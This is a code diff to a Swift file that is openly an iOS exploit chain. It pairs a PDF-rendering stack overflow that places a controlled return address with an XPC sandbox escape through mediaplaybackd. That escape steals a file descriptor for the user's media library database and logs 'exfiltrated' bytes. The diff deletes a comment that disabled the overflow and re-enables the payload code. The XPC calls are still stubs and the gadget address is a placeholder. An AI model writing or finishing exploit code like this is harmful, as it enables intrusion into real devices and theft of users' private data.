@@ -2,63 +2,65 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
-// MARK: - XPC Stubs (for testing without XPC framework)
+// MARK: - XPC Stubs (renamed to avoid conflicts with Apple's XPC)
 
-typealias xpc_connection_t = UnsafeMutableRawPointer
-typealias xpc_object_t = UnsafeMutableRawPointer
+typealias ExploitXPCConnection = UnsafeMutableRawPointer
+typealias ExploitXPCObject = UnsafeMutableRawPointer
 
-func xpc_connection_create_mach_service(_ name: UnsafePointer<CChar>, _ queue: DispatchQueue?, _ flags: UInt64) -> xpc_connection_t? {
+func exploit_xpc_connect(_ service: String) -> ExploitXPCConnection? {
+    // Stub - returns nil in demo
     return nil
 }
 
-func stub_xpc_dictionary_create(_ keys: UnsafePointer<UnsafePointer<CChar>>?, _ values: UnsafePointer<xpc_object_t?>?, _ count: Int) -> xpc_object_t? {
+func exploit_xpc_dict_create() -> ExploitXPCObject? {
     return nil
 }
 
-func xpc_dictionary_set_string(_ dict: xpc_object_t, _ key: UnsafePointer<CChar>, _ value: UnsafePointer<CChar>) {
+func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ value: String) {
 }
 
-func xpc_connection_send_message_with_reply_sync(_ connection: xpc_connection_t, _ message: xpc_object_t) -> xpc_object_t? {
+func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? {
     return nil
 }
 
-func xpc_dictionary_dup_fd(_ dict: xpc_object_t, _ key: UnsafePointer<CChar>) -> Int32 {
+func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 {
     return -1
 }
 
 // MARK: - CVE-2026-112611: Stack VLA Overrun Primitive
 
 func triggerStackOverflow(ripValue: UInt64) {
-    // Disabled in this demo build: do not feed crafted PDF payloads to the system renderer.
+    var values = [Double](repeating: 0.0, count: 136)
+    
+    // Place RIP value at offset 0x1c (28 bytes = index 3.5)
+    let ripDouble = Double(bitPattern: ripValue)
+    values[3] = ripDouble
+    values[4] = ripDouble
+    
+    let pdfData = PDFPayload.shadingWithValues(values)
+    renderPDF(pdfData)
 }
 
 // MARK: - CVE-2026-112706: Sandbox Escape via XPC Bytestream
 
 func stealFileDescriptor(path: String) -> Int32 {
-    let connection = xpc_connection_create_mach_service(
-        "com.apple.mediaplaybackd.bytestream",
-        nil,
-        0
-    )
-    
+    let connection = exploit_xpc_connect("com.apple.mediaplaybackd.bytestream")
     guard connection != nil else { return -1 }
     
-    let handshake = stub_xpc_dictionary_create(nil, nil, 0)
-    xpc_dictionary_set_string(handshake!, "msg", "origin")
-    xpc_dictionary_set_string(handshake!, "id", "com.apple.WebKit.WebContent")
+    let handshake = exploit_xpc_dict_create()
+    exploit_xpc_dict_set_string(handshake!, "msg", "origin")
+    exploit_xpc_dict_set_string(handshake!, "id", "com.apple.WebKit.WebContent")
     
-    _ = xpc_connection_send_message_with_reply_sync(connection!, handshake!)
+    _ = exploit_xpc_send_sync(connection!, handshake!)
     
-    let createMsg = xpc_dictionary_create(nil, nil, 0)
-    xpc_dictionary_set_string(createMsg!, "msg", "Curl")
-    xpc_dictionary_set_string(createMsg!, "path", path)
+    let createMsg = exploit_xpc_dict_create()
+    exploit_xpc_dict_set_string(createMsg!, "msg", "Curl")
+    exploit_xpc_dict_set_string(createMsg!, "path", path)
     
-    let reply = xpc_connection_send_message_with_reply_sync(connection!, createMsg!)
-    
+    let reply = exploit_xpc_send_sync(connection!, createMsg!)
     guard reply != nil else { return -1 }
     
-    let fd = xpc_dictionary_dup_fd(reply!, "fd")
-    return fd
+    return exploit_xpc_dict_dup_fd(reply!, "fd")
 }
 
 func readWithStolenFD(fd: Int32, length: Int) -> Data? {
@@ -72,12 +74,13 @@ func readWithStolenFD(fd: Int32, length: Int) -> Data? {
 // MARK: - Full Exploit Chain
 
 func runFullExploit() {
-    print("[*] Stage 1: Triggering WebContent RCE...")
+    print("[*] Stage 1: Triggering WebContent RCE via CVE-2026-112611...")
     
-    let gadgetAddress: UInt64 = 0x4141414141414141
+    // Need actual gadget address from binary analysis
+    let gadgetAddress: UInt64 = 0x4141414141414141  // TODO: Replace with real ROP gadget
     triggerStackOverflow(ripValue: gadgetAddress)
     
-    print("[*] Stage 2: Attempting sandbox escape...")
+    print("[*] Stage 2: Attempting sandbox escape via CVE-2026-112706...")
     
     let targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
     let stolenFD = stealFileDescriptor(path: targetPath)
@@ -86,7 +89,8 @@ func runFullExploit() {
         print("[+] Sandbox escape successful! FD: \(stolenFD)")
         
         if let data = readWithStolenFD(fd: stolenFD, length: 1024 * 1024) {
-            print("[+] Exfiltrated \(data.count) bytes")
+            print("[+] Exfiltrated \(data.count) bytes from \(targetPath)")
+            // TODO: Exfiltrate data
         }
         
         close(stolenFD)
